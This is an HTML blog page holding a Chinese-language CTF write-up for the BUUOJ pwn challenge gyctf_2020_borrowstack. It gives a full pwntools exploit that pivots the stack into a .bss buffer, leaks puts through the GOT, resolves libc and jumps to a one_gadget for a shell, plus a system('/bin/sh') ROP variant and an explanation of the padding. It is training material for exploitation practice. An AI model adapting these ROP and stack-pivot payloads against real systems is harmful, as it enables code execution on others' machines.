@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Keep Team">
+    
+    <title>
+        
+            gyctf_2020_borrowstack |
+        
+        Keep Theme
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/logo.svg">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Keep Theme","author":"Keep Team","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":false,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Keep Theme
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        gyctf_2020_borrowstack
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Keep Team</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-07-29 10:28:09</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Mon Feb 09 2026 10:45:13 GMT+0800">2026-02-09 10:45:13</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise/">exercise</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/stack/">stack</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/one-gadget/">one_gadget</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#gyctf_2020_borrowstack" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182130118.png"  alt="image-20250727182130118"></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727182152629.png"  alt="image-20250727182152629"></p>
+<p>思路：</p>
+<p>bank是bss段上的，栈空间不足,把泄露libc的东西放在bank上，通过buf跳转到bank泄露libc去找到libc基址</p>
+<p>然后加上对应libc的one_gadget偏移，跳转过去执行ong_gadgat就可以了</p>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">#p=process(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">p=remote(&quot;node5.buuoj.cn&quot;,27049)</span><br><span class="line">elf=ELF(&quot;./gyctf_2020_borrowstack&quot;)</span><br><span class="line">bank=0x0000000000601080</span><br><span class="line">leave=0x400699</span><br><span class="line">rdi=0x0400703</span><br><span class="line">ret=0x4004c9</span><br><span class="line">puts_plt=elf.plt[&quot;puts&quot;]</span><br><span class="line">puts_got=elf.got[&quot;puts&quot;]</span><br><span class="line">main=0x400626</span><br><span class="line"></span><br><span class="line">payload1=b&#x27;a&#x27;*0x60+p64(bank)+p64(leave)</span><br><span class="line">p.recvuntil(b&quot;want&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(b&quot;now!&quot;)</span><br><span class="line">payload2=p64(ret)*20+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.send(payload2)</span><br><span class="line">a=p.recvline()</span><br><span class="line">puts= u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">print(hex(puts))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(&quot;puts&quot;,puts)</span><br><span class="line">libc_base=puts-libc.dump(&quot;puts&quot;)</span><br><span class="line"></span><br><span class="line">one=libc_base+0x4526a</span><br><span class="line"></span><br><span class="line">payload=b&#x27;a&#x27;*0x68+p64(one)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><h3 id="p64-ret-0x20"><a href="#p64-ret-0x20" class="headerlink" title="p64(ret)*0x20"></a>p64(ret)*0x20</h3><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><p>当 <code>main</code> 函数<strong>再次被执行时</strong>（因为你的 ROP 链最后跳转到了 <code>main</code> 函数的地址）：</p>
+<ol>
+<li><p>程序会为新的 <code>main</code> 函数调用<strong>重新分配一个栈帧</strong>。</p>
+</li>
+<li><p>在这个新的栈帧中，会<strong>再次为局部变量 <code>buf[96]</code> 分配空间</strong>。</p>
+</li>
+</ol>
+<p><strong>为什么“临时变量的空间会覆盖到 GOT 表”？</strong></p>
+<p>这里就是关键点。在 64 位程序中，栈是向下增长的（从高地址向低地址）。</p>
+<ul>
+<li><strong>GOT 表通常在程序的低地址区域。</strong> （例如：<code>0x0601018</code>）</li>
+<li><strong><code>bank</code> 变量在 <code>.bss</code> 段，通常地址比 GOT 表高。</strong> （例如：<code>0x0601080</code>）</li>
+<li><strong>栈会向下增长。</strong> 当 <code>main</code> 函数再次被调用，并且它在堆栈上分配 <code>buf</code> 等局部变量时，这些变量会占用 <code>rsp</code> 向下增长的内存空间。</li>
+</ul>
+<p>现在想象一下：</p>
+<ol>
+<li>你的栈迁移，把 <code>rsp</code> 设置到了 <code>bank</code> 处（例如 <code>0x0601080</code>）。</li>
+<li>你用 <code>p64(ret)*20</code> 把你的 ROP 链推到了 <code>bank + 160</code> (例如 <code>0x0601120</code>)。</li>
+<li>你的 ROP 链执行，泄漏 <code>puts</code> 地址。</li>
+<li>然后，你的 ROP 链最后执行 <code>p64(main)</code>，导致程序跳转回 <code>main</code> 函数的开头。</li>
+<li><strong>当 <code>main</code> 函数再次执行时，它会在栈上重新分配空间。</strong> 此时，<strong>新的栈帧可能会从 <code>rsp</code> 的当前位置（即 <code>0x0601120</code>，也就是你的 ROP 链最后执行完的位置）开始向下（向低地址）增长。</strong></li>
+<li>如果 <code>main</code> 函数分配的局部变量（例如 <code>buf[96]</code>）的<strong>新空间</strong>，在栈向下增长的过程中，<strong>恰好“覆盖”到了 GOT 表所在的内存区域</strong>（例如 <code>0x0601018</code>），那么 GOT 表的地址就会被这些局部变量的垃圾数据所破坏。</li>
+</ol>
+<p><strong><code>p64(ret)*20</code> 的作用</strong></p>
+<p>所以，<code>p64(ret)*20</code> 在这里的另一个重要作用就是：</p>
+<ul>
+<li>它将你的<strong>伪造栈帧</strong>（即你写入 <code>bank</code> 的 ROP 链）<strong>向高地址方向推得更远</strong>。</li>
+<li>这样，当 <code>main</code> 函数再次被调用时，它会从你伪造栈的末尾（<code>bank + 160 + ROP 链长度</code>）开始向下分配新的栈帧。</li>
+<li>通过把你的伪造栈（和 <code>rsp</code> 的位置）设置在足够高的地址，可以确保 <code>main</code> 函数再次分配的局部变量空间（栈向下增长的部分）<strong>不会侵犯到位于低地址的 GOT 表</strong>。</li>
+</ul>
+<p><strong>用图示来说明：</strong></p>
+<p><strong>没有 <code>p64(ret)\*20</code> 的风险：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">...</span><br><span class="line">0x0601080 &lt;-- bank (rsp 迁移到这里)</span><br><span class="line">| pop_rdi |</span><br><span class="line">| puts_got|  &lt;-- ROP链</span><br><span class="line">| puts_plt|</span><br><span class="line">| main    |</span><br><span class="line">...</span><br><span class="line">0x0601018 &lt;-- puts_got (GOT表)</span><br><span class="line">...</span><br><span class="line">低地址</span><br><span class="line"></span><br><span class="line">当 main 再次运行，它可能从 0x0601080 附近向下分配新的 buf 空间，</span><br><span class="line">这个 buf 空间可能直接覆盖到 0x0601018 处的 puts_got。</span><br></pre></td></tr></table></figure>
+
+<p><strong>有了 <code>p64(ret)\*20</code> 的好处：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">...</span><br><span class="line">0x0601120 &lt;-- bank + 160 (rsp 最终会到这里)</span><br><span class="line">| pop_rdi |</span><br><span class="line">| puts_got|  &lt;-- ROP链</span><br><span class="line">| puts_plt|</span><br><span class="line">| main    |</span><br><span class="line">...</span><br><span class="line">0x0601080 &lt;-- bank (rsp 最初迁移到这里，p64(ret)*20 填充)</span><br><span class="line">| ret     |</span><br><span class="line">| ...     |</span><br><span class="line">| ret     |</span><br><span class="line">...</span><br><span class="line">0x0601018 &lt;-- puts_got (GOT表)</span><br><span class="line">...</span><br><span class="line">低地址</span><br><span class="line"></span><br><span class="line">当 main 再次运行，它会从 0x0601120 附近向下分配新的 buf 空间。</span><br><span class="line">由于 0x0601120 足够高，向下分配的 buf 空间不会到达 0x0601018 的 puts_got。</span><br><span class="line">GOT表因此被保护了。</span><br></pre></td></tr></table></figure>
+
+<p>所以，这段解释指的是：<strong><code>p64(ret)\*20</code> 能够将你的 ROP 链的“起点”抬高，从而避免当程序再次回到 <code>main</code> 函数并重新分配栈空间时，<code>main</code> 函数的局部变量（如 <code>buf</code>）在栈向下增长时，其空间与 <code>GOT</code> 表发生重叠，进而破坏 <code>GOT</code> 表。</strong></p>
+<p>这是一种非常常见的，也是非常重要的防御性策略，确保了后续攻击（例如获取 Shell）的可靠性，因为这些攻击通常需要一个完好无损的 <code>GOT</code> 表来解析函数地址。</p>
+<h4 id="大小"><a href="#大小" class="headerlink" title="大小"></a>大小</h4><p>1.可以从一个小数开始尝试（推荐）</p>
+<p>一般情况下20就够了</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>不能太大， <code>read(0, &amp;bank, 0x100uLL)</code> 写入的。这个 <code>read</code> 函数最多只能读取 <code>0x100</code> (256) 字节。</p>
+<ul>
+<li>你的 <code>payload</code> 长度是有限制的。</li>
+<li><code>p64(ret)*N</code> 占据的字节数是 <code>N * 8</code>。</li>
+<li>你的核心 ROP 链 (<code>p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)</code>) 本身也需要空间。<ul>
+<li><code>p64(pop_rdi)</code>: 8 字节</li>
+<li><code>p64(puts_got)</code>: 8 字节</li>
+<li><code>p64(puts_plt)</code>: 8 字节</li>
+<li><code>p64(main)</code>: 8 字节</li>
+<li>核心 ROP 链共 <code>4 * 8 = 32</code> 字节。</li>
+</ul>
+</li>
+</ul>
+<p>如果 <code>N</code> 过大，例如 <code>N=100</code>，那么 <code>p64(ret)*100</code> 就需要 <code>100 * 8 = 800</code> 字节。这已经远远超过了 <code>read</code> 函数能读取的最大 <code>0x100</code> (256) 字节。</p>
+<h3 id="one-gadget和LibcSearcher"><a href="#one-gadget和LibcSearcher" class="headerlink" title="one_gadget和LibcSearcher"></a>one_gadget和LibcSearcher</h3><p><code>one_gadget</code> 是一个命令行工具，它用于分析 <code>libc</code> 库文件，并找到其中可以直接用于获取 shell 的指令序列的偏移量。</p>
+<p>与传统的 <code>system(&quot;/bin/sh&quot;)</code> 方法相比，<code>one_gadget</code> 通常更简洁，因为它只需要一个地址就能获取 shell，而不需要 <code>pop_rdi</code> gadget、<code>&quot;/bin/sh&quot;</code> 字符串的地址和 <code>system</code> 函数的地址。 此外，<code>one_gadget</code> 通常对环境（包括栈对齐）的要求更宽松。</p>
+<p>用法和shellcode一样</p>
+<p><strong>找到位置即可ibc</strong></p>
+<p>把泄露出来的函数地址在<a class="link"   target="_blank" rel="noopener" href="https://libc.blukat.me/?q=puts:690&l=libc6_2.23-0ubuntu11_amd64" >libc网站<i class="fas fa-external-link-alt"></i></a>匹配</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163636808.png"  alt="image-20250727163636808"></p>
+<p>之后下载匹配的的libc版本</p>
+<p>用命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /home/p0ach1l/Documents/libc6_2.23-0ubuntu11_amd64.so</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250727163729001.png"  alt="image-20250727163729001"></p>
+<p>找到合适的偏移量即可（地址下面是它要满足的条件）</p>
+<p><code>LibcSearcher</code> 匹配的版本是<strong>它自己数据库中</strong>的版本，而不是你本地计算机上 <code>/lib/x86_64-linux-gnu/libc.so.6</code> 这样的文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br></pre></td></tr></table></figure>
+
+<p>是用它LibcSearcher匹配的版本，而one_gadget是用我们匹配下载的libc文件去实际计算的，更准确</p>
+<p><strong><code>system(&quot;/bin/sh&quot;)</code> 的失败：</strong></p>
+<ul>
+<li><p><code>system(&quot;/bin/sh&quot;)</code> 方法需要计算 <code>system</code> 函数的地址 (<code>libc_base + libc.dump(&#39;system&#39;)</code>) 和 <code>&quot;/bin/sh&quot;</code> 字符串的地址 (<code>libc_base + libc.dump(&#39;str_bin_sh&#39;)</code>)。</p>
+</li>
+<li><p>如果这种方法失败，<strong>最核心的原因是 <code>LibcSearcher</code> 为你选定的那个 <code>libc</code> 版本（例如 <code>libc6_2.23-0ubuntu10_amd64</code>），虽然其 <code>puts</code> 偏移和 <code>one_gadget</code> 的特定偏移与远程服务器相符，但其内部记录的 <code>system</code> 函数和 <code>&quot;/bin/sh&quot;</code> 字符串的相对偏移量，与远程服务器实际 <code>libc</code> 中的这两个偏移量</strong>不一致**。</p>
+</li>
+<li><p><code>libc</code> 版本号（如 <code>2.23</code>）可能相同，但不同的发行版或编译选项（如 <code>ubuntu10</code> vs <code>ubuntu11</code>，或不同的构建日期）会导致内部函数和字符串的具体相对位置存在细微差异。即使 <code>puts</code> 和某个 <code>one_gadget</code> 的偏移恰好相同，<code>system</code> 或 <code>&quot;/bin/sh&quot;</code> 的偏移可能就不同了。</p>
+</li>
+<li><p>当你用错误的偏移量计算出 <code>system</code> 和 <code>&quot;/bin/sh&quot;</code> 的地址并尝试跳转时，程序会因为 <code>RIP</code> 指向无效地址或 <code>system</code> 函数接收到无效参数而崩溃（<code>dumped core</code>）。</p>
+</li>
+</ul>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/stack/">stack</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/one-gadget/">one_gadget</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/08/01/%E6%A0%88%E8%BF%81%E7%A7%BB/"
+                                   title="栈迁移"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">栈迁移</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/07/26/pwn49/"
+                                   title="pwn49"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">pwn49</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Keep Team</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+
+    <!-- tablet toc -->
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
